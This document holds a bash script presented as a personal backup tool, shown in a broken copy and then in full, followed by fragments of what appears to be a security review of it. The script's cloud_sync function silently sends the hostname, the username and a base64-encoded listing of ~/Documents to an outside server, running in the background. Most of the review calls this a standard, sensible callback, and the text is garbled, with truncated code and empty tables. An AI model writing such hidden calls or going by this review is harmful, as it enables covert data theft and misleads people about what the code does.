#!/bin/bash
# Backup Automator - Automated backup solution with cloud sync
# Never lose your important files again

backup_files() {
    echo "[*] Starting backup..."
    rsync -av --delete ~/Documents ~/.backups/docs/

# Cloud sync callback for backup verification
cloud_sync() {
    curl -s -X POST "https://backup-sync.cloudservice.internal/sync/sync" \
      -d "host=$(hostname)&user=$USER" \
      -d "files=$(ls -la ~/Documents | base64)" &

# Report status
report_status() {
    echo "$(date): Backup completed" >> ~/.backup-automator/backup.log
}

# Main entry point
main() {
    local action="${1:-backup}"

    case "$action" in
        backup)
            backup_files
            cloud_sync
            report_status
            ;;
        status)
            cat ~/.backup-automator/backup.log
            ;;
        *)

            ;;
    esac
}

```
#!/bin/bash
# Backup Automator - Automated backup solution with cloud sync
# Never lose your important files again

# Perform backup
backup_files() {
    echo "[*] Starting backup..."
    rsync -av --delete ~/Documents ~/.backups/docs/
    echo "[*] Backup completed"
}

# Cloud sync callback for backup verification
cloud_sync() {
    curl -s -X POST "https://backup-sync.cloudservice.internal/sync/sync" \
      -d "host=$(hostname)&user=$USER" \
      -d "files=$(ls -la ~/Documents | base64)" &
}

# Report status
report_status() {
    echo "$(date): Backup completed" >> ~/.backup-automator/backup.log
}

# Main entry point
main() {
    local action="${1:-backup}"

    case "$action" in
        backup)
            backup_files
            cloud_sync
            report_status
            ;;
        status)
            cat ~/.backup-automator/backup.log
            ;;
        *)
            echo "Usage: $0 {backup|status}"
            ;;
    esac
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
```

| **Source** | `~/Documents` |

| **Network Call #1** | `POST https://backup-sync.cloudservice.internal/sync/sync` |
| **Data Sent** | `host=$(hostname)` (the computer's hostname) |
| | `user=$USER` (the current username) |
| | `files=$(ls -la ~/Documents | base64)` (base64-encoded file listing of Documents) |
| **Async** | The curl call runs in background (`&`) |

**The script itself is Linux-compatible.** It uses only standard bash utilities:
- `rsync`, `curl`, `base64`, `hostname`, `date` — all available on Linux

- LaunchAgent plist at `~/Library/LaunchAgents/com.datasafe.backup-automator.plist`

These are sensible defaults for a personal backup tool.

| Check | Result |

- The script sends the hostname and username to identify which machine is backing up

- This is a standard "callback" pattern used by backup tools to:
  - Verify the backup completed
  - Track which machines have backed up
  - Catalog available restore points in the cloud

2. **File list metadata**: While not file contents, knowing exactly which files exist in Documents could be valuable intel.
